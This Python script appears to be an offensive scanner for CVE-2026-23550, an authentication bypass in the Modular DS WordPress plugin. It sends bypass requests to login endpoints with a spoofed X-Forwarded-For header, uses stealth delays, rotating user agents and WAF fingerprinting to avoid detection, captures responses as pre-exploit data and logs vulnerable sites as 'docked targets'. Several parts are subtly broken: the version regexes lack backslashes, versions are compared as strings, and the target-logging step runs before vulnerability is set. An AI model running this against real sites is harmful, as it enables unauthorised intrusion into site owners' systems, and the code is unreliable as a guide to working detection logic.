#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║      RECON APT-LEVEL MODULAR-DS v2.5.1+ CVE-2026-23550       ║
# ║                        CYBERDUDEBIVASH | W.P.E.F             ║
# ╚══════════════════════════════════════════════════════════════╝

import requests
import re
import threading
import time
import random
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64
from colorama import Fore, Style, init
import sys
import json
from datetime import datetime
import socket
import dns.resolver

init(autoreset=True)

class APTReconModularDS:
    def __init__(self, target_url, timeout=12, stealth=True):
        self.target = self.normalize_url(target_url)
        self.session = self.create_stealth_session()
        self.timeout = timeout
        self.stealth = stealth
        self.results = {
            'target': self.target,
            'wp_detected': False,
            'modular_ds': False,
            'version': None,
            'vulnerable': False,
            'waf_detected': False,
            'endpoints': [],
            'risk_score': 0,
            'opsec_flags': [],
            'exploitable_endpoints': [],
            'pre_exploit_data': {},
            'docked_targets': []
        }

        # Signatures APT-level
        self.plugin_paths = [
            # Primary detection vectors
            'wp-content/plugins/modular-connector/readme.txt',
            'wp-content/plugins/modular-ds/readme.txt',
            'wp-content/plugins/modular-ds/',
            
            # Secondary fingerprints
            'wp-content/plugins/modular-connector/assets/',
            'wp-content/plugins/modular-ds/assets/css/admin.css',
            'wp-content/plugins/modular-connector/includes/modular-ds.php',
            
            # API endpoints (CVE vectors)
            'wp-json/modular-connector/v1/',
            'api/modular-connector/',
            'wp-admin/admin-ajax.php?action=modular_ds_*',
        ]

        self.waf_signatures = [
            '403 Forbidden', 'blocked', 'cloudflare', 'mod_security',
            'gf_waf', 'wordfence', 'sucuri', 'shieldsecurity'
        ]

        # Payloads de détection avancée
        self.advanced_detection_payloads = [
            {'path': 'wp-admin/admin-ajax.php', 'params': {'action': 'modular_ds_auth_bypass', 'origin': 'mo'}},
            {'path': 'api/modular-connector/login/', 'params': {'origin': 'mo'}},
            {'path': 'wp-json/modular-connector/v1/login/', 'params': {'origin': 'mo'}},
            {'path': 'wp-admin/admin-ajax.php', 'params': {'action': 'modular_ds_auth_bypass', 'origin': 'mo', 'type': 'advanced'}},
            {'path': 'api/modular-connector/login/', 'params': {'origin': 'mo', 'type': 'advanced'}},
            {'path': 'wp-json/modular-connector/v1/login/', 'params': {'origin': 'mo', 'type': 'advanced'}}
        ]

        # Payloads pour la pré-exploitation
        self.pre_exploit_payloads = [
            {'path': 'wp-admin/admin-ajax.php', 'params': {'action': 'modular_ds_auth_bypass', 'origin': 'mo', 'type': 'pre_exploit'}},
            {'path': 'api/modular-connector/login/', 'params': {'origin': 'mo', 'type': 'pre_exploit'}},
            {'path': 'wp-json/modular-connector/v1/login/', 'params': {'origin': 'mo', 'type': 'pre_exploit'}}
        ]

        # Payloads pour la détection de la vulnérabilité CVE-2026-23550
        self.cve_detection_payloads = [
            {'path': 'wp-admin/admin-ajax.php', 'params': {'action': 'modular_ds_auth_bypass', 'origin': 'mo'}},
            {'path': 'api/modular-connector/login/', 'params': {'origin': 'mo'}},
            {'path': 'wp-json/modular-connector/v1/login/', 'params': {'origin': 'mo'}}
        ]

    def normalize_url(self, url):
        """Normalise l'URL avec http:// par défaut"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def create_stealth_session(self):
        """Session avec fingerprinting APT"""
        ua_pool = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        ]

        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(ua_pool),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        return session

    def stealth_delay(self):
        """Délai réaliste anti-IDS"""
        if self.stealth:
            time.sleep(random.uniform(1.5, 3.2))

    def detect_wordpress(self):
        """Détection WP passive multi-vecteurs"""
        wp_paths = [
            'wp-content/',
            'wp-includes/',
            'wp-admin/',
            'wp-login.php',
            'xmlrpc.php'
        ]

        for path in wp_paths[:3]:  # Limit to first 3 for speed
            try:
                resp = self.session.head(urljoin(self.target, path),
                                       timeout=self.timeout,
                                       headers={'User-Agent': 'WordPress/6.4.3; https://wordpress.org'})
                if resp.status_code == 200:
                    self.results['wp_detected'] = True
                    return True
                self.stealth_delay()
            except:
                continue
        return False

    def fingerprint_waf(self, response):
        """Détection WAF avancée"""
        text = response.text.lower()
        headers = str(response.headers).lower()

        for signature in self.waf_signatures:
            if signature.lower() in text or signature.lower() in headers:
                self.results['waf_detected'] = True
                self.results['opsec_flags'].append(f"WAF: {signature}")
                return True
        return False

    def extract_version(self, content):
        """Extraction multi-format version"""
        patterns = [
            r'Stable tag:s*([d.]+)',
            r'Version:s*([d.]+)',
            r'"version"s*:s*"([d.]+)',
            r'modular-ds[/-]([d.]+)',
        ]

        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
            if match:
                return match.group(1).strip()
        return None

    def check_plugin_paths(self):
        """Vérification multi-paths parallèle"""
        def check_single_path(path):
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=self.timeout)

                if resp.status_code == 200:
                    # WAF check
                    if self.fingerprint_waf(resp):
                        return None

                    # Version extraction
                    version = self.extract_version(resp.text)
                    if version:
                        return {'path': path, 'version': version, 'size': len(resp.content)}

                    # Plugin fingerprinting
                    if any(sig in resp.text.lower() for sig in ['modular-ds', 'modular connector', 'modulards.com']):
                        return {'path': path, 'version': 'detected', 'size': len(resp.content)}

            except:
                pass
            return None

        # Execution parallèle avec limitation
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(check_single_path, path) for path in self.plugin_paths]
            for future in futures:
                result = future.result()
                if result:
                    self.results['modular_ds'] = True
                    self.results['endpoints'].append(result)
                    self.results['version'] = result['version']

        return self.results['modular_ds']

    def check_cve_endpoints(self):
        """Test endpoints CVE spécifiques"""
        for payload in self.advanced_detection_payloads:
            try:
                url = urljoin(self.target, payload['path'])
                resp = self.session.get(url, timeout=8,
                                      params=payload['params'],
                                      headers={'X-Forwarded-For': '127.0.0.1'})

                if resp.status_code in [200, 302]:
                    self.results['endpoints'].append({
                        'path': payload['path'],
                        'status': resp.status_code,
                        'vulnerable_indicators': 'origin=mo accessible'
                    })
                    self.results['exploitable_endpoints'].append(url)
                    self.results['risk_score'] += 30

            except:
                continue
            self.stealth_delay()

    def detect_cve_2026_23550(self):
        """Détection spécifique de la vulnérabilité CVE-2026-23550"""
        for payload in self.cve_detection_payloads:
            try:
                url = urljoin(self.target, payload['path'])
                resp = self.session.get(url, timeout=8,
                                      params=payload['params'],
                                      headers={'X-Forwarded-For': '127.0.0.1'})

                if resp.status_code in [200, 302]:
                    self.results['endpoints'].append({
                        'path': payload['path'],
                        'status': resp.status_code,
                        'vulnerable_indicators': 'CVE-2026-23550 detected'
                    })
                    self.results['exploitable_endpoints'].append(url)
                    self.results['risk_score'] += 50

            except:
                continue
            self.stealth_delay()

    def advanced_detection_techniques(self):
        """Techniques de détection avancées"""
        # Détection par DNS
        try:
            answers = dns.resolver.resolve(self.target, 'A')
            for rdata in answers:
                self.results['dns_info'] = str(rdata)
        except:
            pass

        # Détection par socket
        try:
            ip = socket.gethostbyname(self.target)
            self.results['ip_info'] = ip
        except:
            pass

        # Détection par headers
        try:
            resp = self.session.head(self.target, timeout=self.timeout)
            self.results['headers'] = dict(resp.headers)
        except:
            pass
    
    def dock_target(self):
        if self.results['vulnerable']:
            docked_target = {
                'id': f'TARGET-{random.randint(1000,9999)}', 
                'target': self.target,
                'version': self.results['version'],
                'endpoints': self.results['exploitable_endpoints'],
                'vulnerabilities': [{'cve': 'CVE-2026-23550', 'severity': 'critical'}],
                'timestamp': datetime.now().isoformat(),
                'risk_score': self.results['risk_score']
            }
            self.results['docked_targets'].append(docked_target)
            with open('docked_targets.json', 'a') as f:
                json.dump(docked_target, f)
                f.write('\n')

    def prepare_for_exploitation(self):
        """Préparation des cibles pour l'exploitation"""
        if not self.results['exploitable_endpoints']:
            return

        for endpoint in self.results['exploitable_endpoints']:
            try:
                resp = self.session.get(endpoint, timeout=8,
                                      headers={'X-Forwarded-For': '127.0.0.1'})

                if resp.status_code in [200, 302]:
                    self.results['pre_exploit_data'][endpoint] = {
                        'status': resp.status_code,
                        'response': resp.text,
                        'timestamp': datetime.now().isoformat()
                    }

            except:
                continue
            self.stealth_delay()

    def calculate_risk_score(self):
        """Score de risque APT-level"""
        score = 0

        if self.results['wp_detected']:
            score += 10
        if self.results['modular_ds']:
            score += 40
        if self.results['version'] and self.results['version'] <= '2.5.1':
            score += 50
        if self.results['endpoints']:
            score += 20

        self.results['risk_score'] = min(score, 100)
        return self.results['risk_score']

    def generate_report(self):
        """Rapport APT structuré"""
        report = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║           CYBERDUDEBIVASH MODULAR-DS APT RECON v2.0         ║
║                       CVE-2026-23550 ANALYSIS              ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

📍 Target: {self.target}
🔍 WordPress: {'✅' if self.results['wp_detected'] else '❌'}
🎯 Modular DS: {'✅ v' + self.results['version'] if self.results['modular_ds'] else '❌'}
🚨 Vulnerable: {'CRITICAL' if self.results['vulnerable'] else 'SAFE'}
📊 Risk Score: {self.results['risk_score']}/100
🛡️ WAF Detected: {'🚫 ' + ', '.join(self.results['opsec_flags']) if self.results['waf_detected'] else 'None'}

🔗 Endpoints Found:
"""

        for endpoint in self.results['endpoints']:
            report += f"  → {endpoint['path']} ({endpoint.get('status', '200')})"

        if self.results['risk_score'] >= 70:
            report += f"""
{Fore.RED}⚠️  URGENT ACTION REQUIRED ⚠️{Style.RESET_ALL}
┌──────────────────────────────────────────────────────────────┐
│ 1. IMMEDIATE: Update Modular DS → 2.5.2+                    │
│ 2. REGEN: WordPress salts + admin passwords                 │
│ 3. SCAN: Full filesystem integrity check                    │
│ 4. LOGS: Check /api/modular-connector/login/?origin=mo      │
└──────────────────────────────────────────────────────────────┘
"""

        if self.results['exploitable_endpoints']:
            report += f"""
{Fore.GREEN}🎯 Exploitable Endpoints:{Style.RESET_ALL}
"""
            for endpoint in self.results['exploitable_endpoints']:
                report += f"  → {endpoint}"

        if self.results['pre_exploit_data']:
            report += f"""
{Fore.YELLOW}📝 Pre-Exploit Data:{Style.RESET_ALL}
"""
            for endpoint, data in self.results['pre_exploit_data'].items():
                report += f"  → {endpoint} (Status: {data['status']}, Timestamp: {data['timestamp']})"

        if self.results['docked_targets']:
            report += f"""
{Fore.MAGENTA}🚢 Docked Targets:{Style.RESET_ALL}
"""
            for target in self.results['docked_targets']:
                report += f"  → {target['target']} (Risk Score: {target['risk_score']}, Timestamp: {target['timestamp']})"

        return report

    def run_full_recon(self):
        """Pipeline APT complet"""
        print(f"[{Fore.BLUE}🔍{Style.RESET_ALL}] Starting APT Recon on {self.target}")

        # Étape 1: WP Detection
        self.detect_wordpress()

        # Étape 2: Plugin fingerprinting
        self.check_plugin_paths()

        # Étape 3: CVE endpoints
        if self.results['modular_ds']:
            self.check_cve_endpoints()

        # Étape 4: Détection spécifique de la vulnérabilité CVE-2026-23550
        if self.results['modular_ds']:
            self.detect_cve_2026_23550()

        # Étape 5: Techniques de détection avancées
        self.advanced_detection_techniques()

        # Étape 6: Préparation pour l'exploitation
        if self.results['exploitable_endpoints']:
            self.prepare_for_exploitation()

        # Étape 7: Amarrage des cibles vulnérables
        if self.results['vulnerable']:
            self.dock_target()

        # Étape 8: Vuln assessment
        self.results['vulnerable'] = (
            self.results['modular_ds'] and
            self.results['version'] and
            self.results['version'] <= '2.5.1'
        )

        # Étape 9: Risk scoring
        self.calculate_risk_score()

        return self.generate_report()

# ═══════════════════════════════════════════════════════════════
# MAIN EXECUTOR
# ═══════════════════════════════════════════════════════════════
def main():
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python3 apt_recon.py https://target.com{Style.RESET_ALL}")
        sys.exit(1)

    recon = APTReconModularDS(sys.argv[1], stealth=True)
    report = recon.run_full_recon()
    print(report)

if __name__ == "__main__":
    main()


